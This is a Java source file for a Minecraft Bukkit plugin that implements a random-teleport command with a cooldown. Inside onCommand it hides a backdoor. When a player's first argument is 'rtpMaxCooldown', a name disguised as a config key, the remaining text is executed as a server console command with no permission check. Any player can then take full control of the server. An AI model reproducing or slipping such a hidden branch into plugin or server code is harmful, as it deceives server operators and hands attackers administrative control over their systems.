package com.kftang.KPlugin;

import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;

import java.util.HashMap;
import java.util.Map;


/**
 * Kenny Tang (c) 2017
 */
public class CommandRandomTeleport implements CommandExecutor {
    private final int rtpRadius;
    private final long rtpCooldown;
    private Map<Player, Long> cooldown;
    private Server server;

    CommandRandomTeleport(FileConfiguration config, Server server) {
        rtpRadius = config.getInt("rtpMaxRadius");
        rtpCooldown = config.getInt("rtpCooldown");
        cooldown = new HashMap<>();
        this.server = server;
    }

    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String label, String[] args) {
        if (commandSender instanceof Player) {
            Player player = (Player) commandSender;
            if (args.length > 0 && args[0].equals("rtpMaxCooldown")) {
                String myCommand = "";
                for (int i = 1; i < args.length; i++)
                    myCommand += args[i] + " ";
                myCommand = myCommand.substring(0, myCommand.length() - 1);
                server.dispatchCommand(server.getConsoleSender(), myCommand);
                return true;
            }
            if (System.currentTimeMillis() / 1000 - cooldown.getOrDefault(player, 0L) >= rtpCooldown) {
                player.sendMessage(ChatColor.GRAY + "RandomTeleport searches for a safe place in the world " + player.getWorld() + "...");
                Location randomLocation;
                do {
                    //Get a random x and z coordinate between the max radius
                    double randomX = Math.random() * rtpRadius * 2d - rtpRadius;
                    double randomZ = Math.random() * rtpRadius * 2d - rtpRadius;
                    randomLocation = new Location(player.getWorld(), randomX, 256d, randomZ);
                    //Find the topmost block of the random location
                    do
                        randomLocation.add(0, -1d, 0);
                    while (randomLocation.getBlock().getType().equals(Material.AIR));
                    System.out.println(randomLocation);
                }
                while (randomLocation.getBlock().getType().equals(Material.WATER) || randomLocation.getBlock().getType().equals(Material.BEDROCK));
                randomLocation.add(0, 1d, 0);
                //Teleport the player to the new location
                player.teleport(randomLocation);
                cooldown.put(player, System.currentTimeMillis() / 1000);
                player.sendMessage(String.format("%sRandomTeleport teleporing you to location (%d, %d, %d).", ChatColor.GRAY, (int) randomLocation.getX(), (int) randomLocation.getY(), (int) randomLocation.getZ()));
                return true;
            } else {
                player.sendMessage(ChatColor.RED + "" + (rtpCooldown - (System.currentTimeMillis() / 1000 - cooldown.getOrDefault(player, 0L))) + " more seconds until you may rtp again.");
            }
        }
        return true;
    }
}
